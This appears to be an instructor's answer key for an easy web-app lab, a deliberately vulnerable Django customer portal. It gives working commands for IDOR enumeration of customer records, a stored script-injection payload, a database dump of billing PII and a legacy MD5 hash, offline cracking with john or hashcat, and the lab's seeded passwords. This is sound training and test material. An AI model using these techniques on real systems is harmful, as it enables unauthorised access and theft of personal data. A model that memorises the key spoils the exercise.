# Solution — 05 FernData (easy, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the portal landing page; it lists accounts and links each to
`/account/<id>/`. `GET /login/` is the staff sign-in (POST `username`/`password`,
Django auth over `auth_user`). `GET /account/<int:id>/` renders a customer record;
`GET /api/profile?user_id=<n>` returns the same record as JSON. `GET /health/` is the
healthcheck. Django 5 + gunicorn; Postgres (`db.ferndata.lab`) is on the network but not
published.

Django's ORM and auto-escaping are safe by default — the planted flaws are the three places
the developers worked around them.

## Intended chain (each finding stands on its own)

1. **IDOR — broken object-level authorization (route + query param).** Neither
   `/account/<int:id>/` nor `/api/profile?user_id=<n>` is authenticated or checks ownership;
   both just `get_object_or_404(Customer, pk=id)` on the id the caller supplies. Walk the id
   space with no session at all:
   ```sh
   curl -s http://127.0.0.1:8505/account/1/            # Alder & Finch Pharmacy
   for i in 1 2 3 4; do curl -s "http://127.0.0.1:8505/api/profile?user_id=$i"; echo; done
   ```
2. **Customer PII exposure.** Those records are the billing book: name, billing email, phone,
   card last-4 and MRR (e.g. `a.morales@alder-finch.example`, card `4417`, MRR `2600`). The
   JSON endpoint hands it over cleanly for exfiltration. This is the reportable data exposure,
   and it is confirmable straight from Postgres:
   ```sh
   docker exec skuggi-webapp-05-db psql -U fern -d fernportal -tAc \
     "SELECT name,email,phone,card_last4,mrr FROM billing_customers"
   ```
3. **Stored XSS via `|safe`.** The account "note" (`Customer.bio`) is rendered with the
   `|safe` filter in `account_detail.html`, so stored HTML executes. Account **#2** (Cobalt
   Robotics) is seeded with a live payload, so the sink is verifiable without first planting
   one:
   ```sh
   curl -s http://127.0.0.1:8505/account/2/ | grep -o "<script>alert('ferndata-xss-7f3a')</script>"
   ```
   The raw `<script>` comes back unescaped — any operator viewing that account runs it.

**Credential finding (reusable material):**
- The `auth_user` table mixes normal **pbkdf2** staff accounts with one legacy CSV-import row,
  `svc_import`, stored as an **unsalted MD5** in Django's `md5$$<hex>` wire format
  (`md5$$0571749e2ac330a7455809c6b0e7af90`). Dump it from Postgres and crack offline:
  ```sh
  docker exec skuggi-webapp-05-db psql -U fern -d fernportal -tAc \
    "SELECT username,password FROM auth_user WHERE username='svc_import'"
  echo '0571749e2ac330a7455809c6b0e7af90' > h.txt
  john --format=raw-md5 --wordlist=rockyou.txt h.txt     # -> sunshine
  # hashcat -m 0 h.txt rockyou.txt   also works
  ```
  `svc_import:sunshine` then logs in at `/login/` (Django's `UnsaltedMD5PasswordHasher`
  verifies it) — valid access from a dumped legacy hash, and a realistic **credential-reuse**
  candidate. The pbkdf2 accounts (`admin`, `nwalsh`) do not crack from `rockyou`.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `customer-pii` | `a.morales@alder-finch.example`, … | Postgres `billing_customers`, and via the IDOR |
| `legacy-md5-hash` | `md5$$0571749e2ac330a7455809c6b0e7af90` | Postgres `auth_user`, user `svc_import` |
| `stored-xss` | `<script>alert('ferndata-xss-7f3a')</script>` | `GET /account/2/` (rendered via `\|safe`) |

Accounts: `svc_import:sunshine` (legacy md5, cracks) · `admin:FernAdmin!2024` (superuser,
pbkdf2) · `nwalsh:Autumn#Leaves7` (staff, pbkdf2).

## Reset

`make lab-restore LAB=05-easy-django` (recreate — drops the Postgres volume; the app's
entrypoint re-migrates and re-seeds on first boot).
